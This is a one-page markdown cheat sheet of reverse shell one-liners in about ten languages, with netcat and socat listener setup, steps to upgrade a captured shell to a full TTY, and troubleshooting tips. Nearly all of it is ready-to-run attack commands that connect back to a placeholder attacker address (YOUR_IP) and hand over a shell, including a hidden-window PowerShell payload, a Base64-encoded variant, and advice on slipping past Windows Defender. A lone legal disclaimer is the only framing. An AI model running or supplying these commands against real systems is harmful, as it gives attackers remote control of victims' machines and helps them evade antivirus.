# Reverse Shell Quick Reference

One-page cheat sheet. For details and alternatives, see the [full manual](README.md).

> ⚠️ **Legal Disclaimer**  
> Use only on systems you own or have permission to test.

---

# 🔥 Most Useful One-Liners

| **Language** | **Command** | **Listener** |
|--------------|-------------|---------------|
| **Bash** | `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1` | `nc -lvnp YOUR_PORT` |
| **Netcat (Linux)** | `nc -e /bin/sh YOUR_IP YOUR_PORT` | `nc -lvnp YOUR_PORT` |
| **Netcat (no -e)** | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc YOUR_IP YOUR_PORT > /tmp/f` | `nc -lvnp YOUR_PORT` |
| **Python** | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` | `nc -lvnp YOUR_PORT` |
| **PHP** | `php -r '$sock=fsockopen("YOUR_IP",YOUR_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` | `nc -lvnp YOUR_PORT` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` | `nc -lvnp YOUR_PORT` |
| **PowerShell (Base64)** | `powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIASgBPAFUAUgBfAEkAUAAiACwARwBPAFUAUgBfAFAATwBSAFQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAYgAyACAAPQAgACQAcwBiACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAcgBpAG4AdABkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAYgB0ACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGIAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBiAHQALAAwACwAJABzAGIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA` | `nc -lvnp YOUR_PORT` |
| **Perl** | `perl -e 'use Socket;$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` | `nc -lvnp YOUR_PORT` |
| **Ruby** | `ruby -rsocket -e 'c=TCPSocket.new("YOUR_IP",YOUR_PORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` | `nc -lvnp YOUR_PORT` |
| **Socat** | `socat TCP:YOUR_IP:YOUR_PORT EXEC:/bin/sh` | `socat TCP-LISTEN:YOUR_PORT -` |
| **Node.js** | `node -e 'require("net").connect(YOUR_PORT,"YOUR_IP",function(){require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})});'` | `nc -lvnp YOUR_PORT` |

---

# 📡 Quick Listener Setup


- Netcat (standard)
```bash
nc -lvnp 4444
```
- Socat (encrypted, if needed)
```bash
socat TCP-LISTEN:4444 -
```
- With socat and OpenSSL (encrypted)
```bash
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -
```

# 🔧 Upgrade to Full TTY (After Connection)

- If your reverse shell is limited, run this to stabilize it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

- Then background the shell (Ctrl+Z), set terminal settings, and foreground it again:

```bash
stty raw -echo; fg
export TERM=xterm
```

---


# 🧠 Troubleshooting

|Problem |Fix|
|----|----|
|No connection| Check YOUR_IP, YOUR_PORT, firewall|
|Shell dies| immediately Add -i flag or use Python upgrade|
|nc -e not available| Use the mkfifo version or Bash method|
|PowerShell blocked |Use the Base64 encoded version|
|Windows Defender catches it |Encode with Base64, use PowerShell, or try different language|

---

 [Back to full manual](README.md)





